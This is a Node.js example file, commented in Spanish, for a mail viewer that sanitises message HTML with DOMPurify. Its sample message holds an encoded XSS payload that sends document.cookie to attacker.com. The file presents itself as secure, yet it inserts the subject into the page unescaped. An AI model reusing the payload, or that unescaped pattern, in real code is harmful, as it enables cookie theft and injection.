const http = require('http');
const url = require('url');
const DOMPurify = require('isomorphic-dompurify'); // npm install isomorphic-dompurify

// Simula un "visor de correo" muy simplificado
// Versión segura: no se hace des-sanitización ciega y se aplica sanitización robusta

function getMessageFromDb(id) {
  const messages = {
    '1': {
      subject: 'Hola',
      // El cuerpo puede contener HTML potencialmente malicioso
      body_sanitized: '&lt;div&gt;Hola usuario&lt;/div&gt;&lt;script&gt;fetch("https://attacker.com/steal?cookie="+document.cookie)&lt;/script&gt;'
    }
  };
  return messages[id] || null;
}

// Función segura para obtener el cuerpo del mensaje
// 1) Decodifica entidades de forma controlada
// 2) Aplica una librería de sanitización robusta (DOMPurify)
function decodeHtmlEntities(str) {
  // Decodificación controlada usando una etiqueta <textarea> en lugar de reemplazos manuales
  // (en Node.js puro, podemos usar una librería; aquí se muestra un ejemplo simple)
  return str
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, '&');
}

function message_body_safe(message) {
  // Paso 1: decodificar entidades si es necesario
  const decoded = decodeHtmlEntities(message.body_sanitized);

  // Paso 2: sanitizar el HTML para eliminar scripts/eventos peligrosos
  const sanitized = DOMPurify.sanitize(decoded, {
    ALLOWED_TAGS: [
      'b', 'i', 'u', 'em', 'strong', 'a', 'p', 'br', 'div', 'span', 'ul', 'ol', 'li'
    ],
    ALLOWED_ATTR: ['href', 'title', 'style']
  });

  return sanitized;
}

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);

  if (parsedUrl.pathname === '/show') {
    const id = parsedUrl.query.id || '1';
    const message = getMessageFromDb(id);

    if (!message) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      return res.end('Mensaje no encontrado');
    }

    // Uso de la función segura que sanitiza el cuerpo del mensaje
    const bodyHtml = message_body_safe(message);

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="utf-8" />
          <title>${message.subject}</title>
        </head>
        <body>
          <h1>${message.subject}</h1>
          <div id="message-body">
            ${bodyHtml}
          </div>
        </body>
      </html>
    `);
  } else {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
  }
});

server.listen(3001, () => {
  console.log('Servidor seguro escuchando en http://localhost:3001');
});
